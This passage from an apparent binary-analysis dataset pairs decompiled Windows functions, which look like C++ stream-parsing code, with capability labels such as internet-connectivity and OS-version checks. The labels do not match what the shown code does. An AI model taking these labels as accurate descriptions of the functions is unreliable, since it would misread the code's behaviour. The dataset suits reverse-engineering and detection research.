= (*pcVar2)(piVar8);\n                        if (cVar7 != cVar5) {\n                            pcVar2 = *(*piVar8 + 0x10);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002daed;\n                            cVar7 = (*pcVar2)(piVar8);\n                            piVar13 = var_48h;\n                            if (var_48h[3] <= var_48h[2]) {\n                                pcVar2 = *(*var_48h + 0x48);\n                                *(&stack0xffffffffffffff30 + iVar9) = 0x14002dc91;\n                                iVar14 = (*pcVar2)(piVar13);\n                                if (iVar14 == -1) {\n                                    var_48h = NULL;\n                                }\n                            }\ncode_r0x00014002d968:\n                            pcVar2 = *(*piVar8 + 0x10);\n                            *(&stack0xffffffffffffff30 + iVar9) = 0x14002d975;\n                            cVar5 = (*pcVar2)(piVar8);\n                            piVar20 = var_48h;\n                            if (cVar5 != cVar7) goto code_r0x00014002d919;\n                        }\n                        uVar23 = var_48h[2];\n                        piVar20 = var_48h;\n                        piVar13 = var_48h;\n                        if (var_48h[3] <= uVar23) goto code_r0x00014002da17;\ncode_r0x00014002d98b:\n                        piVar20[2] = uVar23 + 1;\n                        uVar10 = uVar10 + 1;\n                    } while (uVar10 + 1 != uVar11);\n                }\n                else {\ncode_r0x00014002d919:\n                    uVar17 = uVar19;\n                    if (uVar10 != uVar11) {\ncode_r0x00014002d922:\n                        var_48h._0_4_ = 0xffffffff;\n                        goto code_r0x00014002d423;\n                    }\n                }\n                var_48h._0_4_ = 0xffffffff;\n                *noname_4 = uVar17;\n                goto code_r0x00014002d42d;\n            }\n        }\n    }\ncode_r0x00014002d423:\n    *var_50h = *var_50h | 4;\ncode_r0x00014002d42d:\n    arg1[1] = piStack152 & 0xffffffff00000000 | var_48h;\n    *arg1 = piVar20;\n    return arg1;\ncode_r0x00014002d848:\n    if (bVar16 == false) {\n        if (uVar19 == 2) {\n            if ((uStack144 & 1) != 0) goto code_r0x00014002d922;\n            uVar19 = *puVar4;\n            uVar10 = uStack144 >> 1;\n            if (uVar19 < uVar10) {\n                if (uVar10 + uVar19 != puVar4[1]) goto code_r0x00014002d922;\n                goto code_r0x00014002ddce;\n            }\n            var_48h._0_4_ = 0xffffffff;\n            if (uVar19 - uVar10 != puVar4[1]) goto code_r0x00014002d423;\n            *puVar4 = uVar19 - uVar10;\n            *var_58h = var_58h[1];\n        }\n        else if (uVar19 != 1) goto code_r0x00014002d922;\n        uVar19 = *puVar4;\ncode_r0x00014002ddce:\n        iVar21 = *(noname_5 + uVar19 * 8);\n        uVar11 = *var_58h;\n        uVar10 = var_48h;\n        if (uVar11 <= var_48h) goto code_r0x00014002d919;\n        if (piVar20 == NULL) {\n            uVar6 = 1;\n            goto code_r0x00014002d9b1;\n        }\n        goto code_r0x00014002d9a0;\n    }\n    uVar10 = *var_58h;\n    if (1 < uVar19) {\n        puVar12 = puStack136;\n        do {\n            if (*puVar12 < uVar10) {\n                uVar10 = *puVar12;\n            }\n            puVar12 = puVar12 + 1;\n        } while (var_58h + piStack112 != puVar12);\n    }\n    if (uVar10 <= var_48h) goto code_r0x00014002d8c6;\n    if (piVar20 == NULL) {\n        uVar22 = piStack128 != NULL & uStack101;\n        uVar6 = uStack101;\n        if (uVar22 != 0) goto code_r0x00014002d8a8;\ncode_r0x00014002d601:\n        if (bVar16 == uVar6) goto code_r0x00014002d8c6;\n    }\n    else {\ncode_r0x00014002d5d9:\n        if (piVar20[2] < piVar20[3]) {\ncode_r0x00014002d5e7:\n            bVar16 = false;\n        }\n        else {\n            pcVar2 = *(*piVar20 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14002d936;\n            iVar14 = (*pcVar2)(piVar20);\n            if (iVar14 != -1) goto code_r0x00014002d5e7;\n            bVar16 = true;\n            piVar20 = NULL;\n        }\n        uVar22 = piStack128 != NULL & uStack101;\n        uVar6 = uStack101;\n        if (uVar22 == 0) goto code_r0x00014002d601;\ncode_r0x00014002d8a8:\n        uVar6 = uVar22;\n        piVar13 = piStack128;\n        if (piStack128[3] <= piStack128[2]) {\n            pcVar2 = *(*piStack128 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14002db75;\n            iVar14 = (*pcVar2)(piVar13);\n            piStack128 = NULL;\n            if (iVar14 != -1) {\n                piStack128 = piVar13;\n            }\n            if (iVar14 != -1) {\n                uVar6 = 0;\n            }\n            goto code_r0x00014002d601;\n        }\n        if (bVar16 == false) goto code_r0x00014002d8c6;\n    }\n    if (piVar20 == NULL) {\ncode_r0x00014002da60:\n        piVar20 = NULL;\n        pcVar2 = *(*piVar8 + 0x20);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x14002da70;\n        uVar6 = (*pcVar2)(piVar8, 0xffffffff);\n        var_50h_2 = var_50h_2 & 0xffffffffffffff00 | uVar6;\n        pcVar2 = *(*piVar8 + 0x10);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x14002da81;\n        uVar6 = (*pcVar2)(piVar8, 0xffffffff);\n    }\n    else {\n        if (piVar20[2] < piVar20[3]) {\n            cVar7 = *piVar20[2];\n        }\n        else {\n            pcVar2 = *(*piVar20 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14002da4f;\n            iVar14 = (*pcVar2)(piVar20);\n            cVar7 = iVar14;\n            if (iVar14 == -1) goto code_r0x00014002da60;\n        }\n        pcVar2 = *(*piVar8 + 0x20);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x14002d630;\n        uVar6 = (*pcVar2)(piVar8, cVar7);\n        var_50h_2 = var_50h_2 & 0xffffffffffffff00 | uVar6;\n        if (piVar20[2] < piVar20[3]) {\n            iVar14 = *piVar20[2];\n        }\n        else {\n            pcVar2 = *(*piVar20 + 0x48);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14002db56;\n            iVar14 = (*pcVar2)(piVar20);\n            if (iVar14 == -1) {\n                piVar20 = NULL;\n            }\n            else {\n                iVar14 = iVar14;\n            }\n        }\n        pcVar2 = *(*piVar8 + 0x10);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x14002d64d;\n        uVar6 = (*pcVar2)(piVar8, iVar14);\n    }\n    if (uVar19 == 0) {\n        var_48h._0_4_ = 0xffffffff;\n        goto code_r0x00014002d423;\n    }\n    piStack120 = piVar20;\n    uVar10 = 0;\n    uStack100 = uStack100 & 0xffffff00 | uVar6;\n    do {\n        while( true ) {\n            cVar7 = *(var_48h + *(noname_5 + puVar4[uVar10] * 8));\n            pcVar2 = *(*piVar8 + 0x20);\n            *(&stack0xffffffffffffff30 + iVar9) = 0x14002d6cc;\n            cVar7 = (*pcVar2)(piVar8, cVar7);\n            if (cVar7 != var_50h_2) break;\ncode_r0x00014002d6d1:\n            uVar10 = uVar10 + 1;\n            if (uVar19 <= uVar10) goto code_r0x00014002d6da;\n        }\n        pcVar2 = *(*piVar8 + 0x10);\n        *(&stack0xffffffffffffff30 + iVar9) = 0x14002d676;\n        cVar7 = (*pcVar2)(piVar8);\n        if (uStack100 == cVar7) goto code_r0x00014002d6d1;\n        uVar19 = uVar19 - 1;\n        piStack112 = uVar19 * 8;\n        puVar4[uVar10] = puVar4[uVar19];\n        var_58h[uVar10] = var_58h[uVar19];\n    } while (uVar10 < uVar19);\ncode_r0x00014002d6da:\n    piVar20 = piStack120;\n    if (uVar19 < 2) goto code_r0x00014002d8c6;\n    uVar10 = *var_58h;\n    goto code_r0x00014002d580;\n}\n",
        "token_count": 7534
    },
    "14003072": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t **\nfcn.140030720(uint64_t **arg1, ulong noname_1, uint64_t **arg3, uint64_t **arg4, int32_t *noname_4, int64_t noname_5, \n             int64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    ulong uVar4;\n    uint8_t uVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint64_t *puVar10;\n    int64_t iVar11;\n    uint64_t *puVar12;\n    int64_t iVar13;\n    bool bVar14;\n    bool bVar15;\n    uint64_t *puVar16;\n    uchar *puVar17;\n    bool bVar18;\n    uint64_t uVar19;\n    int64_t iVar20;\n    uint64_t *puVar21;\n    uint64_t uVar22;\n    uint64_t *puVar23;\n    uint64_t *puVar24;\n    uint8_t uVar25;\n    ulong var_8h_2;\n    int32_t iVar26;\n    uint32_t *var_bp_50h;\n    ulong uStack160;\n    uchar auStack152 [32];\n    ulong uStack120;\n    uint64_t *puStack112;\n    uint64_t *puStack104;\n    uint64_t *puStack96;\n    uint64_t *puStack88;\n    uint64_t *puStack80;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    puStack88 = arg3[1];\n    puStack96 = *arg4;\n    puVar23 = arg4[1];\n    puVar24 = *arg3;\n    puVar16 = noname_7 + 0xd0;\n    iVar7 = puStack88;\n    puStack104 = puStack104 & 0xffffffff00000000 | puStack88 & 0xffffffff;\n    uStack160 = 0x14003076d;\n    puStack80 = puStack96;\n    puVar10 = fcn.1400b36a0(puVar16);\n    uStack160 = 0x140030788;\n    iVar11 = fcn.14000e880(puVar16);\n    puVar12 = puStack104;\n    uVar22 = puStack104 & 0xffffffff;\n    iVar11 = -iVar11;\n    puVar17 = &stack0xffffffffffffff68 + iVar11;\n    puStack104._0_1_ = iVar7 == -1;\n    piVar1 = &stack0xffffffffffffff88 + iVar11;\n    bVar18 = puVar24 != NULL && puStack104;\n    puVar21 = puStack96;\n    bVar14 = bVar18;\n    if ((bVar18) && (puStack104._0_1_ = 0,  puVar24[3] <= puVar24[2])) {\n        puStack112 = puStack96;\n        puStack104 = puStack104 & 0xffffffffffffff00;\n        puStack96 = puStack96 & 0xffffffff00000000 | puVar12 & 0xffffffff;\n        pcVar3 = *(*puVar24 + 0x48);\n        *(&stack0xffffffffffffff60 + iVar11) = 0x140030aee;\n        puVar16 = puVar24;\n        iVar7 = (*pcVar3)();\n        uVar22 = puStack96 & 0xffffffff;\n        puVar21 = puStack112;\n        if (iVar7 == -1) {\n            puVar24 = NULL;\n            bVar14 = false;\n            puStack104._0_1_ = bVar18;\n        }\n    }\n    puStack112._0_1_ = puVar23 == -1;\n    bVar15 = puVar21 != NULL && puStack112;\n    bVar18 = puStack112;\n    if (bVar15) {\n        if (puVar21[2] < puVar21[3]) {\n            bVar18 = false;\n        }\n        else {\n            puStack104 = puStack104 & 0xffffffffffffff00 | puStack104;\n            puStack96 = puStack96 & 0xffffffff00000000 | uVar22;\n            puStack80 = puVar21;\n            pcVar3 = *(*puVar21 + 0x48);\n            *(&stack0xffffffffffffff60 + iVar11) = 0x140030c01;\n            iVar7 = (*pcVar3)();\n            uVar22 = puStack96 & 0xffffffff;\n            puVar16 = NULL;\n            if (iVar7 != -1) {\n                puVar16 = puStack80;\n            }\n            puStack80 = puVar16;\n            puVar16 = puVar21;\n            bVar18 = iVar7 == -1 && bVar15;\n        }\n    }\n    if (bVar18 != puStack104) {\n        uVar19 = uVar22;\n        if (bVar14) {\n            if (puVar24[2] < puVar24[3]) {\n                uVar19 = *puVar24[2];\n            }\n            else {\n                puStack96 = puStack96 & 0xffffffff00000000 | uVar22;\n                pcVar3 = *(*puVar24 + 0x48);\n                *(&stack0xffffffffffffff60 + iVar11) = 0x140030c5a;\n                puVar16 = puVar24;\n                uVar8 = (*pcVar3)();\n                uVar22 = puStack96 & 0xffffffff;\n                uVar9 = 0xffffffff;\n                if (uVar8 != 0xffffffff) {\n                    uVar9 = uVar8;\n                }\n                uVar19 = uVar9;\n                if (uVar8 == 0xffffffff) {\n                    puVar24 = NULL;\n                }\n            }\n        }\n        iVar13 = noname_6 * 2;\n        if (iVar13 != 0) {\n            puVar23 = NULL;\n            puStack104 = puVar24;\n            iVar20 = 0;\n            puStack112 = puStack112 & 0xffffffffffffff00 | puStack112;\n            puStack96 = puStack96 & 0xffffffff00000000 | uVar22;\n            do {\n                while (**(noname_5 + iVar20 * 8) == uVar19) {\ncode_r0x000140030a23:\n                    piVar1[puVar23] = iVar20;\n                    iVar20 = iVar20 + 1;\n                    puVar23 = puVar23 + 1;\n                    if (iVar20 == iVar13) goto code_r0x000140030a34;\n                }\n                pcVar3 = *(*puVar10 + 0x10);\n                *(&stack0xffffffffffffff60 + iVar11) = 0x140030a09;\n                puVar16 = puVar10;\n                cVar6 = (*pcVar3)();\n                if (cVar6 == uVar19) goto code_r0x000140030a23;\n                iVar20 = iVar20 + 1;\n            } while (iVar20 != iVar13);\ncode_r0x000140030a34:\n            puVar24 = puStack104;\n            uVar22 = puStack96 & 0xffffffff;\n            if (puVar23 != NULL) {\n                if (puStack104[2] < puStack104[3]) {\n                    puStack104[2] = puStack104[2] + 1;\n                    puVar12 = puStack80;\n                }\n                else {\n                    puStack96 = puStack80;\n                    puStack80 = puVar23;\n                    pcVar3 = *(*puStack104 + 0x50);\n                    *(&stack0xffffffffffffff60 + iVar11) = 0x140030c3b;\n                    puVar16 = puVar24;\n                    (*pcVar3)();\n                    puVar23 = puStack80;\n                    puVar12 = puStack96;\n                }\n                *(&stack0xffffffffffffff60 + iVar11) = 0x140030a7b;\n                iVar13 = fcn.14000e880(puVar16);\n                puVar16 = NULL;\n                iVar13 = -iVar13;\n                puVar17 = &stack0xffffffffffffff68 + iVar13 + iVar11;\n                puStack80 = puVar12;\n                puStack96 = &stack0xffffffffffffff88 + iVar13 + iVar11;\n                do {\n                    uVar4 = *(noname_5 + piVar1[puVar16] * 8);\n                    *(&stack0xffffffffffffff60 + iVar13 + iVar11) = 0x140030aa5;\n                    uVar22 = sub.msvcrt.dll_strlen(uVar4);\n                    *(&stack0xffffffffffffff88 + iVar13 + iVar11 + puVar16 * 8) = uVar22;\n                    puVar16 = puVar16 + 1;\n                } while (puVar23 != puVar16);\n                uVar22 = 0xffffffff;\n                uVar19 = 1;\n                puVar23 = puStack96;\n                uVar25 = puStack112;\n                goto code_r0x0001400307e0;\n            }\n        }\n    }\n    puVar16 = NULL;\n    uVar19 = 0;\n    puVar23 = NULL;\n    uVar25 = puStack112;\ncode_r0x0001400307e0:\n    do {\n        puStack96._0_1_ = uVar22 == -1;\n        bVar14 = puVar24 != NULL && puStack96;\n        puStack104._0_1_ = puStack96;\n        if (bVar14) {\n            if (puVar24[2] < puVar24[3]) {\n                puStack104._0_1_ = 0;\n            }\n            else {\n                puStack112 = puStack112 & 0xffffffff00000000 | uVar22;\n                puStack104 = puStack104 & 0xffffffffffffff00 | bVar14;\n                puStack96 = puStack96 & 0xffffffffffffff00 | puStack96;\n                pcVar3 = *(*puVar24 + 0x48);\n                *(puVar17 + -8) = 0x140030bba;\n                iVar7 = (*pcVar3)(puVar24);\n                uVar22 = puStack112 & 0xffffffff;\n                if (iVar7 == -1) {\n                    puVar24 = NULL;\n                }\n                else {\n                    puStack104._0_1_ = 0;\n                }\n            }\n        }\n        puVar12 = puStack80;\n        uVar5 = puStack80 != NULL & uVar25;\n        puStack112._0_1_ = uVar25;\n        if (uVar5 == 0) {\ncode_r0x000140030811:\n            if (puStack112 == puStack104) break;\n        }\n        else {\n            if (puStack80[3] <= puStack80[2]) {\n                uStack120._4_4_ = uVar22;\n                puStack112 = puStack112 & 0xffffffffffffff00 | uVar5;\n                puStack104 = puStack104 & 0xffffffffffffff00 | puStack104;\n                puStack96 = puStack96 & 0xffffffffffffff00 | puStack96;\n                pcVar3 = *(*puStack80 + 0x48);\n                *(puVar17 + -8) = 0x140030b74;\n                iVar7 = (*pcVar3)(puVar12);\n                uVar22 = uStack120._4_4_;\n                puVar12 = NULL;\n                if (iVar7 != -1) {\n                    puVar12 = puStack80;\n                }\n                puStack80 = puVar12;\n                if (iVar7 != -1) {\n                    puStack112._0_1_ = 0;\n                }\n                goto code_r0x000140030811;\n            }\n            if (puStack104 == 0) break;\n        }\n        if ((puVar24 == NULL) || (puStack96 == 0)) {\n            cVar6 = uVar22;\n        }\n        else if (puVar24[2] < puVar24[3]) {\n            cVar6 = *puVar24[2];\n        }\n        else {\n            puStack96 = puStack96 & 0xffffffff00000000 | uVar22;\n            pcVar3 = *(*puVar24 + 0x48);\n            *(puVar17 + -8) = 0x140030b3b;\n            iVar7 = (*pcVar3)(puVar24);\n            uVar22 = puStack96 & 0xffffffff;\n            cVar6 = iVar7;\n            if (iVar7 == -1) {\n                cVar6 = -1;\n                puVar24 = NULL;\n            }\n        }\n        if (puVar16 == NULL) goto code_r0x000140030908;\n        puVar12 = NULL;\n        puVar21 = NULL;\n        do {\n            while (puVar23[puVar12] <= uVar19) {\n                puVar21 = puVar21 + 1;\ncode_r0x000140030848:\n                puVar12 = puVar12 + 1;\n                if (puVar16 <= puVar12) goto code_r0x00014003087e;\n            }\n            if (*(*(noname_5 + piVar1[puVar12] * 8) + uVar19) == cVar6) goto code_r0x000140030848;\n            puVar16 = puVar16 + -1;\n            piVar1[puVar12] = piVar1[puVar16];\n            puVar23[puVar12] = puVar23[puVar16];\n        } while (puVar12 < puVar16);\ncode_r0x00014003087e:\n        if (puVar16 == puVar21) break;\n        if (puVar24[2] < puVar24[3]) {\n            puVar24[2] = puVar24[2] + 1;\n        }\n        else {\n            pcVar3 = *(*puVar24 + 0x50);\n            *(puVar17 + -8) = 0x14003098a;\n            (*pcVar3)(puVar24);\n        }\n        uVar19 = uVar19 + 1;\n        uVar22 = 0xffffffff;\n    } while( true );\n    if (puVar16 == 0x1) {\n        uVar2 = *puVar23;\njoined_r0x000140030992:\n        if (uVar2 == uVar19) {\ncode_r0x000140030998:\n            iVar7 = *piVar1;\n            if (iVar26 <= iVar7) {\n                iVar7 = iVar7 - iVar26;\n            }\n            *noname_4 = iVar7;\n            goto code_r0x000140030912;\n        }\n    }\n    else if (puVar16 == 0x2) {\n        if (*puVar23 != uVar19) {\n            uVar2 = puVar23[1];\n            goto joined_r0x000140030992;\n        }\n        goto code_r0x000140030998;\n    }\ncode_r0x000140030908:\n    *var_bp_50h = *var_bp_50h | 4;\ncode_r0x000140030912:\n    arg1[1] = puStack88 & 0xffffffff00000000 | uVar22;\n    *arg1 = puVar24;\n    return arg1;\n}\n",
        "token_count": 3568
    },
    "140032f7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t **\nfcn.140032f70(int64_t **arg1, ulong noname_1, int64_t **arg3, int64_t **arg4, uint *noname_4, int64_t noname_5, \n             uint64_t noname_6, int64_t noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n             ulong arg_70h, ulong arg_78h, ulong arg_80h, ulong arg_88h, ulong arg_90h)\n\n{\n    uint64_t *puVar1;\n    ushort uVar2;\n    int64_t *piVar3;\n    int64_t *piVar4;\n    code *pcVar5;\n    ulong uVar6;\n    int16_t iVar7;\n    uint16_t uVar8;\n    int16_t iVar9;\n    int64_t *piVar10;\n    int64_t iVar11;\n    uint64_t uVar12;\n    int16_t *piVar13;\n    uint64_t *puVar14;\n    int64_t iVar15;\n    int64_t *piVar16;\n    uint64_t uVar17;\n    bool bVar18;\n    uint8_t uVar19;\n    uint8_t uVar20;\n    uint uVar21;\n    uint64_t uVar22;\n    int64_t *piVar23;\n    uint64_t uVar24;\n    bool bVar25;\n    bool bVar26;\n    bool bVar27;\n    ulong var_8h_2;\n    uint32_t *var_50h;\n    ulong auStack224 [5];\n    uint64_t auStack184 [2];\n    int64_t *piStack168;\n    uint64_t uStack160;\n    uint64_t *puStack152;\n    int64_t *piStack144;\n    int64_t *piStack136;\n    uint8_t uStack121;\n    int64_t iStack120;\n    uint64_t var_68h;\n    int64_t *var_60h;\n    uint64_t *var_58h;\n    uint64_t *var_50h_2;\n    int64_t *var_48h;\n    ulong var_40h;\n    ulong var_31h;\n    ulong var_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_8h;\n    \n    piVar23 = arg3[1];\n    piVar16 = *arg3;\n    piVar3 = *arg4;\n    piVar4 = arg4[1];\n    noname_7 = noname_7 + 0xd0;\n    var_48h = var_48h & 0xffffffff00000000 | piVar23 & 0xffffffff;\n    auStack224[0] = 0x140032fc3;\n    piStack168 = piVar23;\n    piStack136 = piVar3;\n    var_50h_2 = piVar16;\n    piVar10 = fcn.1400b3700(noname_7);\n    auStack224[0] = 0x140032fd6;\n    iVar11 = fcn.14000e880(noname_7);\n    uVar12 = var_48h & 0xffffffff;\n    iVar11 = -iVar11;\n    bVar25 = piVar23 == -1;\n    bVar18 = bVar25 && piVar16 != NULL;\n    piVar23 = var_50h_2;\n    bVar27 = bVar25;\n    if (bVar18) {\n        if (piVar16[2] < piVar16[3]) {\n            iVar7 = *piVar16[2];\n        }\n        else {\n            pcVar5 = *(*piVar16 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140033a2d;\n            iVar7 = (*pcVar5)(piVar16);\n            uVar12 = var_48h & 0xffffffff;\n        }\n        bVar27 = iVar7 == -1 && bVar18;\n        piVar23 = NULL;\n        if (iVar7 != -1) {\n            piVar23 = piVar16;\n        }\n    }\n    bVar26 = piVar4 == -1;\n    uStack121 = bVar26;\n    bVar18 = piVar3 != NULL && bVar26;\n    if (bVar18) {\n        if (piVar3[2] < piVar3[3]) {\n            iVar7 = *piVar3[2];\n            var_48h = piVar23;\n        }\n        else {\n            var_50h_2 = var_50h_2 & 0xffffffff00000000 | uVar12;\n            var_48h = piVar23;\n            pcVar5 = *(*piVar3 + 0x48);\n            *(&stack0xffffffffffffff20 + iVar11) = 0x140033a8d;\n            iVar7 = (*pcVar5)(piVar3);\n            uVar12 = var_50h_2 & 0xffffffff;\n        }\n        bVar26 = iVar7 == -1 && bVar18;\n        piStack136 = NULL;\n        if (iVar7 != -1) {\n            piStack136 = piVar3;\n        }\n        piVar23 = var_48h;\n    }\n    uVar21 = uVar12;\n    if (bVar26 != bVar27) {\n        if ((piVar23 == NULL) || (!bVar25)) {\n            uVar12 = uVar12 & 0xffff;\n        }\n        else {\n            if (piVar23[2] < piVar23[3]) {\n                uVar12 = *piVar23[2];\n                var_48h = piVar23;\n            }\n            else {\n                var_50h_2 = var_50h_2 & 0xffffffff00000000 | uVar12;\n                var_48h = piVar23;\n                pcVar5 = *(*piVar23 + 0x48);\n                *(&stack0xffffffffffffff20 + iVar11) = 0x140033ab6;\n                uVar12 = (*pcVar5)(piVar23);\n                uVar21 = SUB84(var_50h_2, 0);\n                uVar12 = uVar12 & 0xffff;\n            }\n            piVar23 = var_48h;\n            if (uVar12 == -1) {\n                piVar23 = NULL;\n            }\n        }\n        var_50h_2 = CONCAT44(var_50h_2._4_4_, uVar21);\n        var_48h = piVar23;\n        pcVar5 = *(*piVar10 + 0x40);\n        *(&stack0xffffffffffffff20 + iVar11) = 0x14003307c;\n        iVar7 = (*pcVar5)(piVar10, uVar12);\n        pcVar5 = *(*piVar10 + 0x30);\n        *(&stack0xffffffffffffff20 + iVar11) = 0x14003308a;\n        uVar8 = (*pcVar5)(piVar10, uVar12);\n        uVar24 = var_50h_2;\n        uVar12 = var_50h_2 & 0xffffffff;\n        piVar23 = var_48h;\n        if (noname_6 != 0) {\n            var_50h_2 = &stack0xffffffffffffff48 + iVar11;\n            var_60h = var_48h;\n            var_68h = var_68h & 0xffffffffffff0000 | uVar24 & 0xffff;\n            var_58h = &stack0xffffffffffffff48 + iVar11 + noname_6 * 8;\n            var_48h = var_48h & 0xffffffffffff0000 | uVar8;\n            uVar24 = 0;\n            uVar12 = 0;\n            do {\n                while( true ) {\n                    uVar17 = uVar12;\n                    uVar2 = **(noname_5 + uVar17 * 8);\n                    pcVar5 = *(*piVar10 + 0x40);\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x1400330ee;\n                    iVar9 = (*pcVar5)(piVar10, uVar2);\n                    if (iVar7 != iVar9) break;\ncode_r0x00014003310a:\n                    uVar6 = *(noname_5 + uVar17 * 8);\n                    uVar22 = uVar24 + 1;\n                    puVar1 = var_58h + uVar24;\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x140033128;\n                    uVar12 = sub.msvcrt.dll_wcslen(uVar6);\n                    *puVar1 = uVar12;\n                    var_50h_2[uVar24] = uVar17;\n                    uVar24 = uVar22;\n                    uVar12 = uVar17 + 1;\n                    if (noname_6 == uVar17 + 1) goto code_r0x000140033141;\n                }\n                pcVar5 = *(*piVar10 + 0x30);\n                *(&stack0xffffffffffffff20 + iVar11) = 0x140033104;\n                iVar9 = (*pcVar5)(piVar10);\n                if (var_48h == iVar9) goto code_r0x00014003310a;\n                uVar12 = uVar17 + 1;\n            } while (noname_6 != uVar17 + 1);\ncode_r0x000140033141:\n            puVar1 = var_50h_2;\n            uVar12 = var_68h & 0xffff;\n            piVar23 = var_60h;\n            if (uVar24 < 2) {\n                var_68h = 0;\n            }\n            else {\n                uStack160 = uVar17 + 1;\n                var_68h = 0;\n                uVar12 = *var_58h;\n                iStack120 = uVar24 * 8;\n                puStack152 = var_58h + 1;\ncode_r0x000140033190:\n                puVar14 = puStack152;\n                uVar17 = uVar12;\n                do {\n                    if (*puVar14 < uVar17) {\n                        uVar17 = *puVar14;\n                    }\n                    puVar14 = puVar14 + 1;\n                } while (var_58h + iStack120 != puVar14);\n                var_68h = var_68h + 1;\n                if (piVar23[2] < piVar23[3]) {\n                    piVar23[2] = piVar23[2] + 2;\n                }\n                else {\n                    pcVar5 = *(*piVar23 + 0x50);\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x14003344a;\n                    (*pcVar5)(piVar23);\n                }\n                if (var_68h == uVar17) {\n                    if (piVar23[2] < piVar23[3]) {\n                        iVar7 = *piVar23[2];\n                    }\n                    else {\n                        pcVar5 = *(*piVar23 + 0x48);\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x140033a77;\n                        iVar7 = (*pcVar5)(piVar23);\n                    }\n                    var_48h._0_1_ = iVar7 == -1;\n                    if (var_48h) {\n                        piVar23 = NULL;\n                    }\n                    uVar20 = piStack136 != NULL & uStack121;\n                    uVar19 = uStack121;\n                    if (uVar20 != 0) {\n                        if (piStack136[2] < piStack136[3]) {\n                            iVar7 = *piStack136[2];\n                        }\n                        else {\n                            var_48h = var_48h & 0xffffffffffffff00 | var_48h;\n                            pcVar5 = *(*piStack136 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140033a43;\n                            iVar7 = (*pcVar5)();\n                        }\n                        if (iVar7 != -1) {\n                            uVar20 = 0;\n                        }\n                        piVar16 = NULL;\n                        if (iVar7 != -1) {\n                            piVar16 = piStack136;\n                        }\n                        piStack136 = piVar16;\n                        uVar19 = uVar20;\n                    }\n                    bVar27 = false;\n                    if (var_48h == uVar19) goto code_r0x000140033590;\n                    if (piVar23 == NULL) {\n                        iVar15 = *piVar10;\ncode_r0x000140033835:\n                        piVar23 = NULL;\n                        pcVar5 = *(iVar15 + 0x40);\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x140033843;\n                        uVar8 = (*pcVar5)(piVar10, 0xffff);\n                        var_60h = var_60h & 0xffffffffffff0000 | uVar8;\n                    }\n                    else {\n                        if (piVar23[2] < piVar23[3]) {\n                            iVar7 = *piVar23[2];\n                        }\n                        else {\n                            pcVar5 = *(*piVar23 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x140033a65;\n                            iVar7 = (*pcVar5)(piVar23);\n                        }\n                        iVar15 = *piVar10;\n                        pcVar5 = *(iVar15 + 0x40);\n                        if (iVar7 == -1) goto code_r0x000140033835;\n                        *(&stack0xffffffffffffff20 + iVar11) = 0x1400334cc;\n                        uVar8 = (*pcVar5)(piVar10);\n                        var_60h = var_60h & 0xffffffffffff0000 | uVar8;\n                        if (piVar23[2] < piVar23[3]) {\n                            iVar7 = *piVar23[2];\n                        }\n                        else {\n                            pcVar5 = *(*piVar23 + 0x48);\n                            *(&stack0xffffffffffffff20 + iVar11) = 0x1400339ae;\n                            iVar7 = (*pcVar5)(piVar23);\n                        }\n                        if (iVar7 == -1) {\n                            piVar23 = NULL;\n                        }\n                    }\n                    uVar22 = 0;\n                    pcVar5 = *(*piVar10 + 0x30);\n                    *(&stack0xffffffffffffff20 + iVar11) = 0x140033506;\n                    uVar8 = (*pcVar5)(piVar10);\n                    uVar17 = var_68h;\n                    piStack144 = piVar23;\n                    var_50h_2 = var_50h_2 & 0xffffffffffff0000 | uVar8;\n                    auStack184[1] = uVar12;\n                    var_48h = var_68h * 2;\n                    do {\n                        if (uVar17 < var_58h[uVar22]) {\n                            pcVar5 = *(*piVar10 + 0x40);\n                            